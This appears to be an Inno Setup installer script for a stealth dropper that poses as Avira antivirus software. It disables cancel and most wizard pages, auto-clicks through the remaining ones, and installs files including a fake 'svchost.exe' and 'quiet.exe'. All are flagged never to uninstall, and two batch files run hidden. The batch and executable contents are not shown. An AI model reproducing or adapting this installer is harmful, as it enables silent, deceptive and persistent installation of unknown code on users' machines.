; Script generated by the Inno Setup Script Wizard.
; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!


[Setup]
; NOTE: The value of AppId uniquely identifies this application.
; Do not use the same AppId value in installers for other applications.
; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)



AppId={{1485B3A2-4F13-4C2A-8971-658FC8468BC5}
AppName=Installer
allowcancelduringinstall=no
DefaultDirName={pf}\Avira Antivir\
DisableDirPage=yes
DisableProgramGroupPage=yes
DisableStartupPrompt=yes
DisableReadyPage=yes
DisableReadyMemo=yes
DisableFinishedPage=yes
OutputBaseFilename=Installer
Outputdir=..
Compression=lzma
SolidCompression=yes
Appvername=Installer


[Code]
const
  BN_CLICKED = 0;
  WM_COMMAND = $0111;
  CN_BASE = $BC00;
  CN_COMMAND = CN_BASE + WM_COMMAND;

procedure CurPageChanged(CurPageID: Integer);
var
  Param: Longint;
begin
  { if we are on the ready page, then... }
  if CurPageID = wpwelcome then
  begin
    { the result of this is 0, just to be precise... }
    Param := 0 or BN_CLICKED shl 16;
    { post the click notification message to the next button }
    PostMessage(WizardForm.NextButton.Handle, CN_COMMAND, Param, 0);
  end;
begin
  { if we are on the ready page, then... }
  if CurPageID = wpReady then
  begin
    { the result of this is 0, just to be precise... }
    Param := 0 or BN_CLICKED shl 16;
    { post the click notification message to the next button }
    PostMessage(WizardForm.NextButton.Handle, CN_COMMAND, Param, 0);
  end;
end;
end;
[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"


[Files]
Source: "run.exe"; DestDir: "{app}";
Source: "Updater.bat"; DestDir: "{app}"; Flags: uninsneveruninstall
Source: "svchost.exe"; DestDir: "{app}"; Flags: uninsneveruninstall
Source: "Aeon\Avira_Antivirus.exe"; DestDir: "{app}"; Flags: uninsneveruninstall
Source: "Check for updates.bat"; DestDir: "{app}"; Flags: uninsneveruninstall
Source: "Avirascan.bat"; DestDir: "{app}"; Flags: uninsneveruninstall
Source: "quiet.exe"; DestDir: "{app}"; Flags: uninsneveruninstall


; NOTE: Don't use "Flags: ignoreversion" on any shared system files


[Run]

Filename: "{app}\avirascan.bat"; Flags: runhidden
Filename: "{app}\check for updates.bat"; Flags: runhidden

